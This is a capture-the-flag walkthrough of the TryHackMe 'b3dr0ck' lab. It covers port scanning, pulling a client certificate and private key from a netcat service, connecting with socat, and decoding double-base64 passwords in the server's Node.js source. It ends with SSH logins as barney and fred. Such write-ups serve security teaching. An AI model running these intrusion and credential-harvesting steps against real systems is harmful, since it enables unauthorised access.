shop.vulnnet.thm# Enumeration
## ping scan
```zsh
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ ping 10.10.10.184                                               ░▒▓ ✔ 
PING 10.10.10.184 (10.10.10.184) 56(84) bytes of data.
64 bytes from 10.10.10.184: icmp_seq=1 ttl=63 time=57.3 ms
64 bytes from 10.10.10.184: icmp_seq=2 ttl=63 time=56.9 ms
64 bytes from 10.10.10.184: icmp_seq=3 ttl=63 time=56.5 ms
^C
--- 10.10.10.184 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 56.494/56.894/57.308/0.332 ms
```
Notes: same ttls, Windows machine?
## nmap scan
```
 PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.10.184:4040/
4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Sat, 22 Oct 2022 11:19:13 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-10-22T10:44:49
|_Not valid after:  2023-10-22T10:44:49
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown     # INTERESTING
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-10-22T10:44:49
|_Not valid after:  2023-10-22T10:44:49
|_ssl-date: TLS randomness does not represent time
```
List of open ports:
- 22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
- 80/tcp    open  http         nginx 1.18.0 (Ubuntu)
- 4040/tcp  open  ssl/yo-main? (redirect from port 80)
- 9009/tcp  open  pichat? (You use this service to recover your client certificate and private key) (connected via nc)
- 54321/tcp open  ssl/unknown (can be accessed only via a cert and a private key obtained from 9009)
## Manual Work
### http
Searching for https://10.10.10.184:80 , redirects me to port 4040 with:
```html
<!DOCTYPE html>
<html>
  <head>
	<title>ABC</title>
	<style>
	  body {
		width: 35em;
		margin: 0 auto;
		font-family: Tahoma, Verdana, Arial, sans-serif;
	  }
	</style>
  </head>

  <body>
	<h1>Welcome to ABC!</h1>
	<p>Abbadabba Broadcasting Compandy</p>

	<p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>

	<p>Barney is helping to setup the server, and he said this info was important...</p>

<pre>
Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...
He said it was from the toilet and OVER 9000!
Need to try and secure connections with certificates...

</pre>
  </body>
</html>
```
### nectcat
Obtaining the cert and the priv. key from 9009:
```
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ nc -nv 10.10.10.184 9009
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.184:9009.


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
What are you looking for? certificate 
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjEwMjIxMDQ0NTlaFw0yMzEwMjIxMDQ0NTlaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDouLzV
1qFJ+Mh56ihAeQWCo05qsUmphSCG8sluz7hc2EvK+puZ9d+SbjDjamgi5mBEJEFt
fgIuNyZGCra2WJ/8T3KKHfhrb44XAsLnS6rDuEScv1dHA+5JKGxnn+eOFn66w5Et
hb2O5MCW8A/S6LwkyuHvPZCN1GoveV5lylWn4STCgqlkb2dIvI63teB657qEnLIy
QIAso8lkjbnpd4NBNEhhiJTgUy5V3RvaNhzBkuOQY1LSiZcZexPZfNhKtmt86Nm/
fh1hqZCppQZ7obS1sjNR2kc6BflfYbMz5SafGQSO7eZlZvoZlwtJTFGFxdMeeM06
O4lwBPdTrRg1aKq1AgMBAAEwDQYJKoZIhvcNAQELBQADggEBAA9wJ7HDy0C+cnep
vWbB+kAJtCSlvnAFXYFHtJgvYK3YWF743LS3L/fdlNI6X+wnTU6kZkdYBBalaSoB
SZKdfRPbhRowuIZb6CciUejgMO6fTOO5a811JcWh+ZHlwgw2yOHHP1bn6HixsNwT
g6bS9yckAK5749IslK0UVXUckaaDJraONv8amqQBz8q4rpp5Rwgw0mxJzvje8hP4
8B3DOHAn+eqVJXGIelsLO4SdQWy6E8SdOlDjSUwQDehvpMjFRv4LqaowWQ6B4Njd
0XV5zRB3TJJdoUWPOg/DzpU+Qgu+k7mCnEQrXzBL0qUDMcBzH9AcJBSWwytSYNDC
9f751SU=
-----END CERTIFICATE-----


What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA6Li81dahSfjIeeooQHkFgqNOarFJqYUghvLJbs+4XNhLyvqb
mfXfkm4w42poIuZgRCRBbX4CLjcmRgq2tlif/E9yih34a2+OFwLC50uqw7hEnL9X
RwPuSShsZ5/njhZ+usORLYW9juTAlvAP0ui8JMrh7z2QjdRqL3leZcpVp+EkwoKp
ZG9nSLyOt7Xgeue6hJyyMkCALKPJZI256XeDQTRIYYiU4FMuVd0b2jYcwZLjkGNS
0omXGXsT2XzYSrZrfOjZv34dYamQqaUGe6G0tbIzUdpHOgX5X2GzM+UmnxkEju3m
ZWb6GZcLSUxRhcXTHnjNOjuJcAT3U60YNWiqtQIDAQABAoIBAFi5pfT5AUEMgpJI
fdQmz70AufLfaLAiu0X35mhC9Y0gQbU/WneWUAipziXF+bHklysjj3ZJJlesWwE1
MHfQzh4JxCd4Sa/cNhX7zYcVSCOaaz4/jOzcSMrHiJzxT/zSArr9uKncZWrHN83T
9JR6etCkMQNfO293Xox+/0hbndCEwaLYok68bkt3m62VaqVbZw4d1NXHQHaToTt5
CdZ613gHHWnFR/kOL2496wbsivc7aVXEibflqBebG6ub4bFZwJiyKpt67BuIf4ka
4+hd5WoMWdYE/K+Cq5Z/Z4nCnwpI1SkYPdHv/gTiT04rvqXIVBSKcLvkXCv75nJe
ovBIc/kCgYEA/AOMFejVZoj2Alt7lu4go6OOd7EQQak1ntF6iYSBdlJiDWL/bxRb
/DDW0xW+5DNrN4csJ3b7Irsj9l3G585g8Pv67GBWOpda7qgoOwvtGDoZ+XvgcT1H
lHTsy9M8AuZtwEm8kIKkKRhnUYiti5w+BbuWBQWHi3yee/sLj+MqwisCgYEA7GcS
jj5TEkU3kUlYBKEQUlmuCCP+CaBswR00iSXcZU3AkpDWdvCFUdxuD4FxR46vEulf
gHmKuahiWhb1bdxCmz6R9/gro9s01/bEHXipjFDKVCnhTOTrMqNnDRxm5yOoA6QT
Cir+0N9pwWlLlv3ZF+elEbSURUHxgxbXndkvNp8CgYBlQ4+gpiRJxTMFE3l/1kOr
PWdb1PwxRirTnFzesS3MO6JGusbk/YtQtNc9jnlb/QVSFLC7UuXquMPklR39u0Hc
04OqQ7Oia3sQduVjhJFKsN4LD6nKFtOSZcFYzZJJoAntwDNS5gvMr4+khYUmmiuZ
5hyL/ALRG8wbCW9F7AQcbQKBgAM12yCnZAVpfzmv30wgy9HyedSOeJK05QUyWlZK
d1XA2o6i/OacmZLlBXGcdmdcXrBJDwz1mZav3LYQfcDCLv1guia97gnJnkwYg81K
qDLJnhXKg87BhRgo8+tPqW4WI9/4yHFo6BD6F7uSrH4ecGZMtQcqhqDyJk97be4s
1uFNAoGAFNXeNRmeYIhjNwj9qCjEgcmyR4H74KgmWz4vog9xZcZnFBguWDWJd7UQ
DCTEDd8f8hnWSunmIwEx3DuZwjP7OtzgYejDGlxB2gWud153Wih1w06XFNVIjCnc
LMtRl86pLjETNYcpy2q7v559JokbgyAaa841C7c5+1x+qRsE7VA=
-----END RSA PRIVATE KEY-----
```
### socat
```zsh
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ socat stdio ssl:10.10.10.184:54321,cert=cert,key=priv_rsa,verify=0 
 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> whoami
Current user = 'Barney Rubble' (valid peer certificate)
b3dr0ck> ls
Unrecognized command: 'ls'
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```
### ssh
```zsh
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ ssh barney@10.10.10.184                                       ░▒▓ INT ✘  15m 6s  
barney@10.10.10.184's password: 
barney@b3dr0ck:~$ ls
barney.txt
barney@b3dr0ck:~$ cat barney.txt 
THM{f05780f08f0eb1de65023069d0e4c90c}
barney@b3dr0ck:~$ whoami 
barney
barney@b3dr0ck:~$ 

```
### python server hosting linpeas.sh
```zsh
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ python3 -m http.server 8000                                                  ░▒▓ ✔ 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
### linpeas.sh takeways
```zsh
Vulnerable to CVE-2021-3560
barney:x:1001:1001:Barney Rubble,,,:/home/barney:/bin/bash
fred:x:1000:1000:Fred Flintstone:/home/fred:/bin/bash
root:x:0:0:root:/root:/bin/bash
/usr/share/openssh/sshd_config
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Wrong!  You cheating scum!
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
```
### what is certutil?
```zsh
barney@b3dr0ck:/usr/bin$  ls -hla certutil
lrwxrwxrwx 1 root root 27 Apr 29 05:23 certutil -> /usr/share/abc/bin/certutil
barney@b3dr0ck:/usr/bin$ cat certutil 
#!/usr/bin/env node


require('../dist/certs');

barney@b3dr0ck:/usr/bin$ sudo certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@b3dr0ck:/usr/bin$ certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Oct 22 10:45 barney.certificate.pem
-rw-r----- 1 root root 1674 Oct 22 10:45 barney.clientKey.pem
-rw-r----- 1 root root  894 Oct 22 10:45 barney.csr.pem
-rw-r----- 1 root root 1674 Oct 22 10:45 barney.serviceKey.pem
-rw-r----- 1 root root  976 Oct 22 10:44 fred.certificate.pem
-rw-r----- 1 root root 1678 Oct 22 10:44 fred.clientKey.pem
-rw-r----- 1 root root  898 Oct 22 10:44 fred.csr.pem
-rw-r----- 1 root root 1674 Oct 22 10:44 fred.serviceKey.pem


barney@b3dr0ck:/usr/bin$ certutil sami sami
node:internal/fs/utils:345
    throw err;
    ^

Error: EACCES: permission denied, open '/usr/share/abc/certs/server.serviceKey.pem'
    at Object.openSync (node:fs:585:3)
    at Object.readFileSync (node:fs:453:35)
    at generateCredentials (/usr/share/abc/dist/certs.js:1:3060)
    at Object.<anonymous> (/usr/share/abc/dist/certs.js:1:3518)
    at Module._compile (node:internal/modules/cjs/loader:1105:14)
    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1159:10)
    at Module.load (node:internal/modules/cjs/loader:981:32)
    at Function.Module._load (node:internal/modules/cjs/loader:822:12)
    at Module.require (node:internal/modules/cjs/loader:1005:19)
    at require (node:internal/modules/cjs/helpers:102:18) {
  errno: -13,
  syscall: 'open',
  code: 'EACCES',
  path: '/usr/share/abc/certs/server.serviceKey.pem'
}
barney@b3dr0ck:/usr/bin$ cat /usr/share/abc/dist/certs.js
```
Notes: nothing gabbed my attention
```js
"use strict";
var __read = this && this.__read || function(o, n) {
    var m = typeof Symbol === "function" && o[Symbol.iterator];
    if (!m) return o;
    var i = m.call(o),
        r, ar = [],
        e;
    try {
        while ((n === void 0 || n-- > 0) && !(r = i.next()).done) ar.push(r.value)
    } catch (error) {
        e = {
            error: error
        }
    } finally {
        try {
            if (r && !r.done && (m = i["return"])) m.call(i)
        } finally {
            if (e) throw e.error
        }
    }
    return ar
};
var __importDefault = this && this.__importDefault || function(mod) {
    return mod && mod.__esModule ? mod : {
        default: mod
    }
};
Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.generateCredentials = void 0;
var safe_1 = __importDefault(require("colors/safe"));
var fs_1 = __importDefault(require("fs"));
var pem_1 = __importDefault(require("pem"));
var path_1 = __importDefault(require("path"));
var child_process_1 = require("child_process");
var SERVICE_SERIAL = 12345;
var SERVICE_CERT_DIR = path_1.default.join(__dirname, "..", "certs");
var SERVICE_KEY_FILE = "server.serviceKey.pem";
var SERVICE_CERT_FILE = "server.certificate.pem";
var SERVICE_KEY_PATH = path_1.default.join(SERVICE_CERT_DIR, SERVICE_KEY_FILE);
var SERVICE_CERT_PATH = path_1.default.join(SERVICE_CERT_DIR, SERVICE_CERT_FILE);
var SERVICE_CERT_LIST = function() {
    return (0, child_process_1.execSync)("ls -al ".concat(SERVICE_CERT_DIR, "/ | grep -v server")).toString()
};
var SERVICE_HELP = "\nCert Tool Usage:\n----------------\n\nShow current certs:\n  certutil ls\n\nGenerate new keypair:\n  certutil [username] [fullname]\n";
var SERVICE_HELP_LIST = function() {
    return "\nCurrent Cert List: (".concat(SERVICE_CERT_DIR, ")\n------------------\n").concat(SERVICE_CERT_LIST(), "\n")
};
var epicFail = function(msg) {
    console.log(safe_1.default.red("EPIC FAIL: ".concat(msg)))
};
var writeKeysSync = function(name, keys) {
    for (var k in keys) {
        var data = keys[k];
        var filename = [name, k, "pem"].join(".");
        var filepath = path_1.default.join(SERVICE_CERT_DIR, filename);
        fs_1.default.writeFileSync(filepath, data);
        if (!fs_1.default.existsSync(filepath)) {
            throw new Error("Failed writing file: ".concat(filepath))
        }
        if (["certificate", "clientKey"].includes(k)) {
            console.log(safe_1.default.dim("Generated: ".concat(k, " for ").concat(name, ": ").concat(filepath)))
        }
    }
};
var generateCredentials = function() {
    var args = process.argv.slice(2);
    var _a = __read(args, 2),
        arg0 = _a[0],
        arg1 = _a[1];
    if (/ls|list|show|find/i.test(arg0)) {
        console.log(SERVICE_HELP_LIST());
        process.exit(0)
    }
    if (/help/i.test(arg0) || args.length < 2) {
        console.log(SERVICE_HELP);
        process.exit(0)
    }
    if (args.length !== 2) {
        console.log(fs_1.default.readFileSync(path_1.default.join(__dirname, "../art/lol.txt")).toString());
        epicFail("wut am i supposed to do with: ".concat(args.join(" "), "?"));
        console.log(SERVICE_HELP);
        process.exit(69)
    }
    if (!fs_1.default.existsSync(SERVICE_KEY_PATH)) {
        epicFail("Missing service certificate: ".concat(SERVICE_CERT_FILE));
        process.exit(69)
    }
    if (!fs_1.default.existsSync(SERVICE_CERT_PATH)) {
        epicFail("Missing service key file: ".concat(SERVICE_KEY_FILE));
        process.exit(69)
    }
    var user = arg0.replace(/[^a-zA-Z0-9 ]/gi, "");
    var name = arg1.replace(/[^a-zA-Z0-9 ]/gi, "");
    pem_1.default.createCertificate({
        commonName: name,
        days: 1,
        serial: SERVICE_SERIAL,
        selfSigned: false,
        serviceKey: fs_1.default.readFileSync(SERVICE_KEY_PATH).toString(),
        serviceCertificate: fs_1.default.readFileSync(SERVICE_CERT_PATH).toString()
    }, (function(err, data) {
        if (err) {
            console.error(err.message || err);
            return
        }
        console.log(safe_1.default.yellow("Generating credentials for user: ".concat(user, " (").concat(name, ")")));
        writeKeysSync(user, data);
        console.log(data.clientKey);
        console.log(data.certificate)
    }))
};
exports.generateCredentials = generateCredentials;
(0, exports.generateCredentials)();
```
```js
"use strict";
var __importDefault = this && this.__importDefault || function(mod) {
    return mod && mod.__esModule ? mod : {
        default: mod
    }
};
Object.defineProperty(exports, "__esModule", {
    value: true
});
var safe_1 = __importDefault(require("colors/safe"));
var fs_1 = __importDefault(require("fs"));
var pem_1 = __importDefault(require("pem"));
var path_1 = __importDefault(require("path"));
var net_1 = require("net");
var tls_1 = require("tls");
var https_1 = require("https");
var dd = function(s) {
    return Buffer.from(Buffer.from(s, "base64").toString(), "base64").toString()
};
var BIND_HOST = "0.0.0.0";
var WEB_PORT = 4040;
var ABC_PORT = 9009;
var SEC_PORT = 54321;
var ABC_PROMPT = "\nWhat are you looking for? ";
var SEC_PROMPT = "\nb3dr0ck> ";
var FRED_SEC = dd("V1dGaVltRkVZV0ppWVVRd01EQXdJUW89Cg==");
var BARNEY_SEC = dd("WkRGaFpEZGpNR0V6T0RBMU9UVTFZVE0xWldJeU5qQmtZV0kwTVRnd1pHUT0=");
var _a = process.env,
    _b = _a.SERVER_CERT_NAME,
    SERVER_CERT_NAME = _b === void 0 ? "server.certificate.pem" : _b,
    _c = _a.SERVER_KEY_NAME,
    SERVER_KEY_NAME = _c === void 0 ? "server.clientKey.pem" : _c,
    _d = _a.SERVER_CA_NAME,
    SERVER_CA_NAME = _d === void 0 ? "server.certificate.pem" : _d;
var AbcServer = function() {
    function AbcServer() {
        this.sockets = []
    }
    AbcServer.prototype.tlsOptions = function(cert, key, caList, requestCert, rejectUnauthorized) {
        if (requestCert === void 0) {
            requestCert = true
        }
        if (rejectUnauthorized === void 0) {
            rejectUnauthorized = true
        }
        var certsDir = path_1.default.join(__dirname, "..", "certs");
        return {
            key: fs_1.default.readFileSync(path_1.default.join(certsDir, key)),
            cert: fs_1.default.readFileSync(path_1.default.join(certsDir, cert)),
            ca: caList ? caList.split(",").map((function(ca) {
                return fs_1.default.readFileSync(path_1.default.join(certsDir, ca.trim()))
            })) : [],
            requestCert: requestCert,
            rejectUnauthorized: rejectUnauthorized
        }
    };
    AbcServer.prototype.log = function(msg) {
        console.log(msg)
    };
    AbcServer.prototype.init = function() {
        this.abc = new net_1.Server;
        this.sec = new tls_1.Server(this.tlsOptions(SERVER_CERT_NAME, SERVER_KEY_NAME, SERVER_CA_NAME, true, false));
        this.web = new https_1.Server(this.tlsOptions(SERVER_CERT_NAME, SERVER_KEY_NAME, SERVER_CA_NAME, false, false), this.connectWebserver.bind(this));
        this.listen();
        this.handle()
    };
    AbcServer.prototype.listen = function() {
        var _this = this;
        this.web.listen(WEB_PORT, BIND_HOST, (function() {
            _this.log("Web server listening: ".concat(BIND_HOST, ":").concat(WEB_PORT))
        }));
        this.abc.listen(ABC_PORT, BIND_HOST, (function() {
            _this.log("ABC server listening: ".concat(BIND_HOST, ":").concat(ABC_PORT))
        }));
        this.sec.listen(SEC_PORT, BIND_HOST, (function() {
            _this.log("SEC server listening: ".concat(BIND_HOST, ":").concat(SEC_PORT))
        }))
    };
    AbcServer.prototype.handle = function() {
        this.abc.on("connection", this.connectSocket.bind(this));
        this.sec.on("secureConnection", this.connectSecureSocket.bind(this))
    };
    AbcServer.prototype.connectWebserver = function(req, res) {
        this.log("".concat(req.method, " ").concat(req.url));
        if (req.url) {
            var baseURL = "http://" + req.headers.host;
            var parsedUrl = new URL(req.url, baseURL);
            var pathname = path_1.default.join(__dirname, "..", "public", parsedUrl.pathname);
            var ext_1 = path_1.default.parse(pathname).ext || ".html";
            var map_1 = {
                ".ico": "image/x-icon",
                ".html": "text/html",
                ".js": "text/javascript",
                ".json": "application/json",
                ".css": "text/css",
                ".png": "image/png",
                ".jpg": "image/jpeg",
                ".svg": "image/svg+xml"
            };
            var exist = fs_1.default.existsSync(pathname);
            if (!exist) {
                res.statusCode = 404;
                res.end("File ".concat(pathname, " not found!"));
                return
            }
            if (fs_1.default.statSync(pathname).isDirectory()) pathname += "index".concat(ext_1);
            fs_1.default.readFile(pathname, (function(err, data) {
                if (err) {
                    res.statusCode = 500;
                    res.end("Error getting the file: ".concat(err, "."))
                } else {
                    res.setHeader("Content-type", map_1[ext_1] || "text/plain");
                    res.end(data)
                }
            }))
        }
    };
    AbcServer.prototype.getAsciiArt = function(name) {
        var artPath = path_1.default.join(__dirname, "..", "art", name);
        return fs_1.default.readFileSync(artPath).toString()
    };
    AbcServer.prototype.getCredsFile = function(name, kind) {
        if (kind === void 0) {
            kind = "certificate"
        }
        var filePath = path_1.default.join(__dirname, "..", "certs", "".concat(name, ".").concat(kind, ".pem"));
        return fs_1.default.readFileSync(filePath).toString()
    };
    AbcServer.prototype.connectSocket = function(socket) {
        var _this = this;
        this.log("Socket connected!");
        socket.write(this.getAsciiArt("welcome.txt") + ABC_PROMPT);
        socket.on("data", (function(data) {
            var res = "";
            var cmd = data.toString().trim();
            if (/fred/i.test(cmd)) {
                res = _this.getAsciiArt("fred.txt")
            } else if (/login|cred(entials)?|help|setup|connect|how|secure|port/i.test(cmd)) {
                res = "Looks like the secure login service is running on port: ".concat(SEC_PORT, "\n\nTry connecting using:\nsocat stdio ssl:MACHINE_IP:").concat(SEC_PORT, ",cert=<CERT_FILE>,key=<KEY_FILE>,verify=0")
            } else if (/public|client|cert/i.test(cmd)) {
                var cert = _this.getCredsFile("barney");
                res = "Sounds like you forgot your certificate. Let's find it for you...\n\n".concat(cert, "\n\n")
            } else if (/private|key|secret/i.test(cmd)) {
                var key = _this.getCredsFile("barney", "clientKey");
                res = "Sounds like you forgot your private key. Let's find it for you...\n\n".concat(key, "\n\n")
            } else {
                res = "Sorry, unrecognized request: '".concat(cmd, "'\n\nYou use this service to recover your client certificate and private key")
            }
            res += ABC_PROMPT;
            socket.write(res)
        }));
        socket.on("close", (function(hasError) {
            _this.log("Socket.on(close): ".concat(hasError ? "ERROR" : "OK"))
        }));
        socket.on("error", (function(err) {
            _this.log("Socket.on(error): ".concat(err.message))
        }))
    };
    AbcServer.prototype.connectSecureSocket = function(socket) {
        var _this = this;
        var _a, _b;
        this.log("TLSSocket connected!");
        var peer = (_b = (_a = socket.getPeerCertificate()) === null || _a === void 0 ? void 0 : _a.subject) === null || _b === void 0 ? void 0 : _b.CN;
        if (!socket.authorized) {
            socket.write(safe_1.default.red("Error: '".concat(peer, "' is not authorized for access.\n")));
            socket.end()
        } else {
            socket.write(this.getAsciiArt("login.txt"));
            var sec_1 = "none";
            if (/barney/i.test(peer)) {
                sec_1 = BARNEY_SEC
            } else if (/fred/i.test(peer)) {
                sec_1 = FRED_SEC
            }
            socket.write(safe_1.default.green("Welcome: '".concat(peer, "' is authorized.")) + SEC_PROMPT);
            socket.on("data", (function(data) {
                var res = "";
                var cmd = data.toString().trim();
                if (/fred/i.test(cmd)) {
                    res = _this.getAsciiArt("fred.txt")
                } else if (/gazoo/i.test(cmd)) {
                    res = _this.getAsciiArt("gazoo.txt")
                } else if (/login/.test(cmd)) {
                    res = "Login is disabled. Please use SSH instead."
                } else if (/user|whoami/.test(cmd)) {
                    res = "Current user = '".concat(peer, "' (valid peer certificate)")
                } else if (/pass(word)?|hint|help|cred(s|entials)?/i.test(cmd)) {
                    res = "".concat(dd("VUdGemMzZHZjbVFnYUdsdWREbz0="), " ").concat(sec_1.trim(), " (user = '").concat(peer, "')")
                } else {
                    res = "Unrecognized command: '".concat(cmd, "'\n\n").concat(dd("VkdocGN5QnpaWEoyYVdObElHbHpJR1p2Y2lCc2IyZHBiaUJoYm1RZ2NHRnpjM2R2Y21RZ2FHbHVkSE09"))
                }
                res += SEC_PROMPT;
                socket.write(res)
            }))
        }
        socket.on("close", (function(hasError) {
            _this.log("TLSSocket.on(close): ".concat(hasError ? "ERROR" : "OK"))
        }));
        socket.on("error", (function(err) {
            _this.log("TLSSocket.on(error): ".concat(err.message))
        }))
    };
    return AbcServer
}();
var generateCredentials = function(cb) {
    var certDir = path_1.default.join(__dirname, "..", "certs");
    var serverOptions = {
        days: 365,
        hash: "sha256",
        selfSigned: true
    };
    var getSignedOptions = function(commonName, serviceKey, serviceCertificate) {
        return {
            commonName: commonName,
            days: 365,
            serial: 1234,
            selfSigned: false,
            serviceKey: serviceKey,
            serviceCertificate: serviceCertificate
        }
    };
    var getUnsignedOptions = function(commonName) {
        return {
            commonName: commonName,
            days: 365,
            selfSigned: true
        }
    };
    var writeKeysSync = function(name, keys) {
        for (var k in keys) {
            var data = keys[k];
            var filename = [name, k, "pem"].join(".");
            var filepath = path_1.default.join(certDir, filename);
            console.log("Generating:", name, k, filename);
            fs_1.default.writeFileSync(filepath, data);
            if (!fs_1.default.existsSync(filepath)) {
                throw new Error("Failed writing file: ".concat(filepath))
            }
            console.log("Saved file:", filepath)
        }
    };
    console.log("Generating Server KeyPair ...");
    pem_1.default.createCertificate(serverOptions, (function(serverErr, serverData) {
        if (serverErr) return cb(serverErr);
        writeKeysSync("server", serverData);
        console.log("Generating Fred KeyPair ...");
        pem_1.default.createCertificate(getSignedOptions("Fred Flintstone", serverData.serviceKey, serverData.certificate), (function(fredErr, fredKeys) {
            if (fredErr) return cb(fredErr);
            writeKeysSync("fred", fredKeys);
            console.log("Generating Barney KeyPair ...");
            pem_1.default.createCertificate(getSignedOptions("Barney Rubble", serverData.serviceKey, serverData.certificate), (function(barneyErr, barneyKeys) {
                if (barneyErr) return cb(barneyErr);
                writeKeysSync("barney", barneyKeys);
                cb()
            }))
        }))
    }))
};
generateCredentials((function(err) {
    if (err) throw err;
    var abcServer = new AbcServer;
    abcServer.init()
}));
```
Notes:
```
var ABC_PROMPT = "\nWhat are you looking for? ";
var SEC_PROMPT = "\nb3dr0ck> ";
var FRED_SEC = dd("V1dGaVltRkVZV0ppWVVRd01EQXdJUW89Cg==");
var BARNEY_SEC = dd("WkRGaFpEZGpNR0V6T0RBMU9UVTFZVE0xWldJeU5qQmtZV0kwTVRnd1pHUT0=");

if (/pass(word)?|hint|help|cred(s|entials)?/i.test(cmd)) {
                    res = "".concat(dd("VUdGemMzZHZjbVFnYUdsdWREbz0="), " ").concat(sec_1.trim(), " (user = '").concat(peer, "')")
                } else {
                    res = "Unrecognized command: '".concat(cmd, "'\n\n").concat(dd("VkdocGN5QnpaWEoyYVdObElHbHpJR1p2Y2lCc2IyZHBiaUJoYm1RZ2NHRnpjM2R2Y21RZ2FHbHVkSE09"))
```
### Decoding
#### Double Base64 decoding
```zsh
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ echo -n "V1dGaVltRkVZV0ppWVVRd01EQXdJUW89Cg==" | base64 -d | base64 -d       ░▒▓ ✔ 
YabbaDabbaD0000!
```
Notes: 
- Password: YabbaDabbaD0000! , this might be Fred's password

### SSH login with Fred's creds
```zsh
    ~/Documents/THM/CTFs/b3dr0ck ▓▒░ ssh fred@10.10.10.184                                                        ░▒▓ ✔ 
fred@10.10.10.184's password: 
fred@b3dr0ck:~$ whoami
fred
